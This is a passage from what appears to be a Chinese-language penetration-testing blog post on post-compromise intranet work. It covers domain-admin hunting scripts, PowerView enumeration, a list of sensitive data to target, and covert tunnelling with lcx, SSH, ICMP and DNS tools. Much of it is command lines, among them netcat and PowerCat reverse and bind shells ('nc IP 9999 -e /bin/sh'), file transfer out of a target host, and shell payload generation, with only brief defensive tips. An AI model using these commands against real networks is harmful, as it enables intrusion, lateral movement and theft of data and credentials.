class="meta">#</span><span class="bash"><span class="comment">## 将域控制器列表添加到 dcs.txt 中，将域管理员列表添加到 admins.txt 中，并于 NetSess.exe NetSess.exe 放在同一目录下，运行下面脚本</span></span></span><br><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR %a in (admins.txt) DO @type sessions.txt | @findstr /I %a</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 也可以利用 Get Domain Admins（GDA）批处理脚本：https://github.com/nullbind/Other-Projects/tree/master/GDA</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 查询远程系统中运行的任务</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 首先从 Domain Admins 组中收集域管理员列表，将目标域系统列表添加到 ips.txt 文件中，将收集的域管理员列表添加到 names.txt 文件中，运行下面脚本</span></span></span><br><span class="line">FOR /F %i in (ips.txt) do @echo [+] %u &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n&gt;NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. 扫描远程系统的 NetBIOS 信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 首先从 Domain Admins 组中收集域管理员列表，将目标域系统列表添加到 ips.txt 文件中，将收集的域管理员列表添加到 admins.txt 文件中，运行下面脚本</span></span></span><br><span class="line">FOR /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n&gt;NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><h3 id="PowerShell-收集信息"><a href="#PowerShell-收集信息" class="headerlink" title="PowerShell 收集信息"></a>PowerShell 收集信息</h3><p>PowerShell 常用执行权限：</p><ul><li>Resricted：默认设置，不允许执行任何脚本</li><li>Allsigned：只能运行经过证书验证的脚本</li><li>Unrestricted：权限最高，可以执行任意脚本</li><li>RemoteSigned：对本地脚本不进行限制，对来自网络的脚本必须验证其签名</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span>  <span class="comment"># 查看执行权限</span></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted  <span class="comment"># 修改执行权限</span></span><br><span class="line"><span class="built_in">Import-Module</span> ./PowerView.ps1  <span class="comment"># 导入下载的 PowerView 脚本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PowerView 常用命令</span></span><br><span class="line"><span class="built_in">Get-NetDomain</span>  <span class="comment"># 获取当前用户所在域的名称</span></span><br><span class="line"><span class="built_in">Get-NetUser</span>  <span class="comment"># 获取所有用户的详细信息</span></span><br><span class="line"><span class="built_in">Get-NetDomainController</span>  <span class="comment"># 获取所有域控制器的信息</span></span><br><span class="line"><span class="built_in">Get-NetComputer</span>  <span class="comment"># 获取域内所有机器的详细信息</span></span><br><span class="line"><span class="built_in">Get-NetOU</span>  <span class="comment"># 获取域内的 OU 信息</span></span><br><span class="line"><span class="built_in">Get-NetGroup</span>  <span class="comment"># 获取域内组和组成员的信息</span></span><br><span class="line"><span class="built_in">Get-NetFileServer</span>  <span class="comment"># 根据 SPN 获取当前域使用的文件服务器信息</span></span><br><span class="line"><span class="built_in">Get-NetShare</span>  <span class="comment"># 获取当前域内的所有网络共享信息</span></span><br><span class="line"><span class="built_in">Get-NetSession</span>  <span class="comment"># 获取指定服务器的会话</span></span><br><span class="line"><span class="built_in">Get-NetRDPSession</span>  <span class="comment"># 获取指定服务器的远程连接</span></span><br><span class="line"><span class="built_in">Get-NetProcess</span>  <span class="comment"># 获取远程主机的进程</span></span><br><span class="line"><span class="built_in">Get-UserEvent</span>  <span class="comment"># 获取指定用户的日志</span></span><br><span class="line"><span class="built_in">Get-ADObject</span>  <span class="comment"># 获取活动目录的对象</span></span><br><span class="line"><span class="built_in">Get-NetGPO</span>  <span class="comment"># 获取域内所有的组策略对象</span></span><br><span class="line"><span class="built_in">Get-DomainPolicy</span>  <span class="comment"># 获取域默认策略或域控制器策略</span></span><br><span class="line"><span class="built_in">Invoke-UserHunter</span>  <span class="comment"># 获取域用户登陆的计算机信息及该用户是否拥有本地管理员权限</span></span><br><span class="line"><span class="built_in">Invoke-ProcessHunter</span>  <span class="comment"># 通过查询域内所有的机器进程找到特定用户</span></span><br><span class="line"><span class="built_in">Invoke-UserEventHunter</span>  <span class="comment"># 根据用户日志查询某域用户登陆过哪些域机器</span></span><br></pre></td></tr></table></figure><h3 id="域分析工具-BloodHound"><a href="#域分析工具-BloodHound" class="headerlink" title="域分析工具 BloodHound"></a>域分析工具 BloodHound</h3><p><a href="https://github.com/BloodHoundAD/BloodHound/releases/">https://github.com/BloodHoundAD/BloodHound/releases/</a></p><h3 id="敏感数据防护"><a href="#敏感数据防护" class="headerlink" title="敏感数据防护"></a>敏感数据防护</h3><h4 id="资料、数据、文件的定位流程"><a href="#资料、数据、文件的定位流程" class="headerlink" title="资料、数据、文件的定位流程"></a>资料、数据、文件的定位流程</h4><ul><li>定位内部人事组织结构</li><li>在内部人事组织结构中寻找需要监视的人员</li><li>定位相关人员的机器</li><li>监视相关人员存放文档的位置</li><li>列出存放文档的服务器的目录</li></ul><h4 id="重点核心业务机器及敏感信息防护"><a href="#重点核心业务机器及敏感信息防护" class="headerlink" title="重点核心业务机器及敏感信息防护"></a>重点核心业务机器及敏感信息防护</h4><h5 id="核心业务机器"><a href="#核心业务机器" class="headerlink" title="核心业务机器"></a>核心业务机器</h5><ul><li>高级管理人员、系统管理员、财务/人事/业务人员的个人计算机</li><li>产品管理系统服务器</li><li>办公系统服务器</li><li>财务应用系统服务器</li><li>核心产品源码服务器（IT 公司通常会架设自己的 SVN 或者 GIT 服务器）</li><li>数据库服务器</li><li>文件服务器、共享服务器</li><li>电子邮件服务器</li><li>网络监控系统服务器</li><li>其他服务器（分公司、工厂）</li></ul><h5 id="敏感信息和敏感文件"><a href="#敏感信息和敏感文件" class="headerlink" title="敏感信息和敏感文件"></a>敏感信息和敏感文件</h5><ul><li>站点源码备份文件、数据库备份文件等</li><li>各类数据库的 Web 管理入口，例如 phpMyAdmin、Adminer</li><li>浏览器密码和浏览器 Cookie</li><li>其他用户会话、3389 和 ipc$ 连接记录、“回收站”中的信息等</li><li>Windows 无线密码</li><li>网络内部的各种账号和密码，包括电子邮箱、VPN、FTP、TeamView等</li></ul><h4 id="应用与文件形式信息的防护"><a href="#应用与文件形式信息的防护" class="headerlink" title="应用与文件形式信息的防护"></a>应用与文件形式信息的防护</h4><p>应用配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等</p><h3 id="分析域内网段划分情况及拓扑结构"><a href="#分析域内网段划分情况及拓扑结构" class="headerlink" title="分析域内网段划分情况及拓扑结构"></a>分析域内网段划分情况及拓扑结构</h3><h4 id="基本架构"><a href="#基本架构" class="headerlink" title="基本架构"></a>基本架构</h4><p>常见的 Web 架构</p><ul><li>ASP + Access + IIS 5.0/6.0 + Windows Server 2003</li><li>ASPX + MSSQL + IIS 7.0/7.5 + Windows Server 2008</li><li>PHP + MySQL + IIS</li><li>PHP + MySQL + Apache</li><li>PHP + MySQL + Nginx</li><li>JSP + MySQL + Nginx</li><li>JSP + MSSQL + Tomcat</li><li>JSP + Oracle + Tomcat</li></ul><h4 id="域内网段划分"><a href="#域内网段划分" class="headerlink" title="域内网段划分"></a>域内网段划分</h4><ul><li><p>DMZ</p></li><li><p>办公区</p><ul><li><p>系统</p><ul><li>OA 系统</li><li>邮件系统</li><li>财务系统</li><li>文件共享系统</li><li>企业版杀毒系统</li><li>内部应用监控系统</li><li>运维管理系统</li></ul></li><li><p>网段</p><ul><li>域管理网段</li><li>内部服务器系统网段</li><li>各部门分区网段</li></ul></li></ul></li><li><p>核心区</p><ul><li>系统<ul><li>业务系统</li><li>运维监控系统</li><li>安全系统</li></ul></li><li>网段<ul><li>业务网段</li><li>运维监控网段</li><li>安全管理网段</li></ul></li></ul></li></ul><h2 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="常用隧道列举"><a href="#常用隧道列举" class="headerlink" title="常用隧道列举"></a>常用隧道列举</h4><ul><li>网络层：IPv6 隧道、ICMP 隧道、GRE 隧道</li><li>传输层：TCP 隧道、UDP 隧道、常规端口转发</li><li>应用层：SSH 隧道、HTTP 隧道、HTTPS 隧道、DNS 隧道</li></ul><h4 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ICMP 协议</span></span><br><span class="line">ping &lt;IP or 域名&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"> TCP 协议</span></span><br><span class="line">nc &lt;IP PORT&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"> HTTP 协议</span></span><br><span class="line">curl &lt;IP:PORT&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"> DNS 协议</span></span><br><span class="line">nslookup www.baidu.com vps-ip  # Windows 自带 DNS 探测命令，没有指定 vps-ip 时，会从系统网络的 TCP/IP 属性中读取 DNS 服务器的地址</span><br><span class="line">dig @vps-ip www.baidu.com  #  Linux 自带 DNS 探测命令，没有指定 vps-ip 时，会从 /etc/resolv.conf 文件中读取系统配置的 DNS 服务器的地址</span><br></pre></td></tr></table></figure><p>还有一种情况流量不能直接流出，需要在内网中设置代理服务器。常见于通过企业办公网段上网的场景，常用判断方法：</p><ul><li><p>查看网络连接，判断是否存在与其他机器的 8080（不绝对）等端口的链接（可以尝试运行 <code>ping -n 1 -a ip</code>）</p></li><li><p>查看内网中是否有主机名类似于 <code>proxy</code> 的机器</p></li><li><p>查看 IE 浏览器的直接代理</p></li><li><p>根据 pac 文件的路径（可能时本地路径，也可能时远程路径），将其下载下来并查看</p></li><li><p>利用 curl 命令进行确认，执行如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com  # 不通</span><br><span class="line">curl -x proxy-ip:port www.baidu.com  # 通</span><br></pre></td></tr></table></figure></li></ul><h3 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h3><h4 id="IPv6-隧道"><a href="#IPv6-隧道" class="headerlink" title="IPv6 隧道"></a>IPv6 隧道</h4><p>配置：<a href="https://lesca.me/archives/how-to-build-ipv6-tunnel-on-windows.html">https://lesca.me/archives/how-to-build-ipv6-tunnel-on-windows.html</a></p><p>支持工具</p><ul><li>socat</li><li>6tunnel</li><li>nt6tunnel</li></ul><h4 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h4><p>常用工具</p><ul><li><p>icmpsh：<a href="https://github.com/inquisb/icmpsh.git">https://github.com/inquisb/icmpsh.git</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1  # 关闭本地系统 ICMP 应答，防止 shell 运行不稳定，恢复则设置为 0</span><br></pre></td></tr></table></figure></li><li><p>PingTunnel：<a href="http://freshmeat.sourceforge.net/projects/ptunnel/">http://freshmeat.sourceforge.net/projects/ptunnel/</a></p></li><li><p>icmptunnel</p></li><li><p>powershell icmp</p></li></ul><p>防御方法</p><ul><li>检测同一来源的 ICmp 数据包的流量，一个正常的 ping 命令每秒最多发送两个数据包，而使用 ICMP 隧道的浏览器会在很短的时间内产生上千个 ICMP 数据包</li><li>注意那些 Payload 大于 64bit 的ICMP 数据包</li><li>寻找响应数据包中的 Payload 与请求数据包中的 Payload 不一致的 ICMP 数据包</li><li>检查 ICMP 数据包的协议标签，例如 icmptunnel 会在所有的 ICMP Payload 前面添加 <code>TUNL</code> 标记来标识隧道</li></ul><h3 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h3><h4 id="lcx-端口转发"><a href="#lcx-端口转发" class="headerlink" title="lcx 端口转发"></a>lcx 端口转发</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 内网端口转发</span></span><br><span class="line">lcx.exe -slave &lt;公网主机IP&gt; 4444 127.0.0.1 3389  # 目标机器执行，将目标机器 3389 所有数据转发到公网 VPS 的 4444 端口</span><br><span class="line">lcx.exe -listen 4444 5555  # VPS 执行，将本机 4444 端口上监听的所有数据转发到本机的 5555 端口上</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 此时，用 mstsc 登录 `&lt;公网主机IP&gt;:5555`，或者在 VPS 上用 mstsc 登录主机 `127.0.0.1:5555` 即可访问目标服务器的 3389 端口</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 本地端口映射</span></span><br><span class="line">lcx.exe -tran 53 &lt;目标机器IP&gt; 3389</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 当部分端口（如 3389）的数据无法通过防火墙，可以将相应端口的数据透传到防火墙允许的其他端口（如 53）</span></span></span><br></pre></td></tr></table></figure><h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 简单使用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （1）命令查询</span></span></span><br><span class="line">nc -h</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （2）Banner 抓取</span></span></span><br><span class="line">nc -nv IP 21</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （3）连接远程主机</span></span></span><br><span class="line">nc -nvv IP 80</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （4）端口扫描</span></span></span><br><span class="line">nc -v IP 80</span><br><span class="line">nc -v -z IP 20-1024  # 扫描指定主机的某个端口段（扫描速度很慢）</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （5）端口监听</span></span></span><br><span class="line">nc -l -p 9999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （6）文件传输</span></span></span><br><span class="line">nc -lp 333 &gt; 1.txt  # 本地 VPS 主机，等待连接</span><br><span class="line">nc -vn IP 333 &lt; test.txt -q 1  # 目标主机，建立连接</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （7）简易聊天</span></span></span><br><span class="line">nc -l -p 888  # 本地 VPS 主机，监听</span><br><span class="line">nc -vn IP 888  # 目标主机</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 获取 shell</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （1）正向 Shell</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 监听目标主机 4444 端口</span></span></span><br><span class="line">nc -lvp 4444 -e /bin/sh  # Linux</span><br><span class="line">nc -lvp 4444 -e C:\windows32\System32\cmd.exe  # Windows</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 本地或 VPS 主机上连接目标主机的 4444 端口</span></span></span><br><span class="line">nc IP 4444</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （2）反向 Shell</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 本地获取 VPS 主机上监听本地 9999 端口</span></span></span><br><span class="line">nc -lvp 9999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 目标主机连接 VPS 主机 9999 端口</span></span></span><br><span class="line">nc IP 9999 -e /bin/sh</span><br><span class="line">nc IP 9999 -e C:\windows\System32\cmd.exe</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 目标主机没有 nc 时反向获取 Shell</span></span><br><span class="line">http://duitutu.cn/fuxk/shell.html</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. 内网代理</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># VPS 监听 3333 短裤</span></span></span><br><span class="line">nc -lvp 3333</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 目标主机</span></span></span><br><span class="line">nc -lvp 3333 -e /bin/sh</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 边界服务器</span></span></span><br><span class="line">nc -v vps-ip 3333 -c &quot;nc -v tar-ip 3333&quot;</span><br></pre></td></tr></table></figure><h5 id="nc-参数"><a href="#nc-参数" class="headerlink" title="nc 参数"></a>nc 参数</h5><ul><li>-d：后台模式</li><li>-e：程序重定向</li><li>-g &lt;网关&gt;：设置路由器跃程通信网关，最多可设置 8 个</li><li>-G &lt;指向器数目&gt;：设置源路由指向器的数量，值为 4 的倍数</li><li>-h：在线帮助</li><li>-i &lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口</li><li>-l：使用监听模式，管理和控制传入的数据</li><li>-n：直接使用 IP 地址（不通过域名服务器）</li><li>-o &lt;输出文件&gt;：指定文件名称，把来往传输的数据转换为十六进制字节码后保存在该文件中</li><li>-p &lt;通信端口&gt;：设置本地主机使用的通信端口</li><li>-r：随机指定本机与远程主机的通信端口</li><li>-s &lt;源地址&gt;：设置本地主机送出数据包的 IP 地址</li><li>-u：使用 UDP 传输协议</li><li>-v：详细输出</li><li>-w &lt;超时秒数&gt;：设置等待连线的时间</li><li>-z：将输入/输出功能关闭，只在扫描通信端口时使用</li></ul><h4 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h4><p><a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powercat.ps1  <span class="comment"># 导入</span></span><br><span class="line">powercat <span class="literal">-h</span></span><br><span class="line"><span class="comment"># 1. 通过 nc 正向连接 PowerCat</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span>  <span class="comment"># 目标机器监听 -l：监听模式，用于入站连接 -p：指定监听端口 -e：指定要启动进程的名称 -v：显示详情</span></span><br><span class="line">nc tar<span class="literal">-IP</span> <span class="number">2333</span> <span class="literal">-vv</span>  <span class="comment"># 本地机器获得 shell</span></span><br><span class="line"><span class="comment"># 2. 通过 nc 反向连接 PowerCat</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-vv</span>  <span class="comment"># 本地机器监听并接收 shell</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br><span class="line"><span class="comment"># 3. 通过 PowerCat 返回 PowerShell</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span>  <span class="comment"># 本地主机监听</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span>- ep  <span class="comment"># 目标主机，-eq：用于返回 PowerShell</span></span><br><span class="line"><span class="comment"># 4. 通过 PowerCat 传输文件</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-of</span> test.txt <span class="literal">-v</span>  <span class="comment"># 本地主机</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-i</span> C:\test.txt <span class="literal">-v</span>  <span class="comment"># 目标主机</span></span><br><span class="line"><span class="comment">## 传输完毕后连接不会自动断开，可以在本地文件末尾追加需要的内容，-i：输入，可以写文件名，也可以直接写字符串 -of：输入文件名，可以在文件名前添加路径</span></span><br><span class="line"><span class="comment"># 5. 用 PowerCat 生成 Payload</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-e</span> cmd <span class="literal">-v</span> <span class="literal">-g</span> &gt;&gt; shell.ps1  <span class="comment"># 本地生成，反弹 cmd</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-ep</span> <span class="literal">-v</span> <span class="literal">-g</span> &gt;&gt; shell.ps1  <span class="comment"># 本地生成，反弹 powershell</span></span><br><span class="line"><span class="comment">## 上传到目标机器并执行</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span>  <span class="comment"># 本地接收 shell</span></span><br></pre></td></tr></table></figure><h3 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h3><h4 id="SSH-协议"><a href="#SSH-协议" class="headerlink" title="SSH 协议"></a>SSH 协议</h4><p>创建 SSH 隧道的常用参数</p><ul><li>-C：压缩传输，提高传输速度</li><li>-f：将 SSH 传输转入后台执行，不占用当前的 Shell</li><li>-N：建立静默连接（建立了连接，但是看不到具体会话）</li><li>-g：允许远程主机连接本地用于转发的端口</li><li>-L：本地端口转发</li><li>-R：远程端口转发</li><li>-D：动态转发（SOCKS 代理）</li><li>-P：指定 SSH 端口</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 本地转发</span></span><br><span class="line">ssh -CfNg -L vps-PORT:tar-IP:tar-PORT root@jump-IP</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 以一个外网 Web 服务器为跳板机，将内网目标机器的某个端口映射到 VPS 机器的某个端口吗，再访问 VPS 的对应端口就相当于访问内网目标机器的对应端口，在 VPS 上执行 netstat -tulnp | grep &quot;1153&quot; 来查看 vps-PORT 端口是否已经连接，然后执行如下命令，在 VPS 中访问 1153 端口</span></span></span><br><span class="line">rdesktop 127.0.0.1:vps-PORT</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 远程转发</span></span><br><span class="line">ssh -CfNg -R vps-PORT:tar-IP:tar-PORT root@jump-IP</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 以一个外网 Web 服务器为跳板机，将 VPS 某个端口的流量转发到内网目标机器的某个端口，然后访问 VPS 的对应端口，就可以访问内网目标机器的对应端口了，在VPS 上访问 vps-PORT 端口</span></span></span><br><span class="line">rdesktop 127.0.0.1:vps-PORT</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 动态转发</span></span><br><span class="line">ssh -CfNg -D vps-PORT root@jump-IP  # 在 VPS 上执行，建立一个动态 SOCKS4/5 代理隧道</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 然后打开浏览器设置代理，通过浏览器访问内网</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 动态端口映射就是建立一个 SSH 加密的 SOCKS4/5 代理通道，任何支持 SOCKS4/5 协议的程序都可以使用这个加密通道进行代理访问</span></span></span><br></pre></td></tr></table></figure><p><strong>防御 SSH 隧道攻击的思路</strong></p><p>主要是因为系统访问控制措施不够</p><ul><li>在系统中配置 SSH 远程管理白名单</li><li>在 ACL 中限制只有特定的 IP 地址才能连接 SSH</li><li>设置系统完全使用带外管理</li></ul><p>如果没有足够的资源来建立带外管理的网络结构，在内网中至少要限制 SSH 远程登陆的地址和双向访问控制策略</p><h4 id="HTTP-HTTPS-协议"><a href="#HTTP-HTTPS-协议" class="headerlink" title="HTTP/HTTPS 协议"></a>HTTP/HTTPS 协议</h4><p>常用工具</p><ul><li>reGeorg：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></li><li>meterpreter</li><li>tunna</li></ul><h4 id="DNS-协议"><a href="#DNS-协议" class="headerlink" title="DNS 协议"></a>DNS 协议</h4><p><code>cat /etc/resolv.conf</code> 查询当前内部域名及 IP，<code>nslookup 内部0域名</code> 查看是否能与内部 DNS 通信， <code>nslookup baidu.com</code> 查询是否能通过内部 DNS 服务器解析外部域名，如果可以则意味着可以使用 DNS 隧道实现隐蔽通信</p><h5 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h5><p><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p><h5 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h5><p><a href="https://github.com/Al1ex/iodine">https://github.com/Al1ex/iodine</a></p><p><strong>防御 DNS 隧道攻击的方法</strong></p><p>防御很 J8 难，下列操作可以防御常见的隧道攻击行为</p><ul><li>禁止网络中的任何人向外部服务器发送 DNS 请求，只允许与受信任的 DNS 服务器通信</li><li>虽然没有人会将 TXT 解析请求发送给 DNS 服务器，但是 dnscat2 和邮件服务器/网关会这样做，因此，可以将邮件服务器/网关列入白名单并阻止传入和传出流量中的 TXT 请求</li><li>跟踪用户的 DNS 查询次数，如果达到阈值，就生成相应的报告</li><li>组织 ICMP</li></ul><h3 id="SOCKS-代理"><a href="#SOCKS-代理" class="headerlink" title="SOCKS 代理"></a>SOCKS 代理</h3><p>常见的网络场景</p><ul><li>服务器在内网中，可以任意访问外部网络</li><li>服务器在内网中，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接</li><li>服务器在内网中，对外只开放了部分端口（例如 80），且服务器不能访问外部网络</li></ul><h4 id="常用-SOCKS-代理工具"><a href="#常用-SOCKS-代理工具" class="headerlink" title="常用 SOCKS 代理工具"></a>常用 SOCKS 代理工具</h4><ul><li>EarthWorm：<a href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a><ul><li>EW 已经永久停止更新，Github 上好像也没了，EW 的新版本 Termite：<a href="https://github.com/rootkiter/Termite">https://github.com/rootkiter/Termite</a></li></ul></li><li>reGeorg</li><li>sSocks</li><li>SocksCap64：<a href="http://www.sockscap64.com/">http://www.sockscap64.com/</a></li><li>Proxifier（很好用的全局代理）：<a href="https://www.proxifier.com/">https://www.proxifier.com/</a></li><li>ProxyChains（Linux 下实现全局代理）</li></ul><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>EW 有六种命令格式：</p><ul><li>正向连接<ul><li>ssokcsd</li></ul></li><li>反向连接<ul><li>rcsocks</li><li>rssocks</li></ul></li><li>复杂网络的多级级联<ul><li>lcx_slave</li><li>lcx_listen</li><li>lcx_tran</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 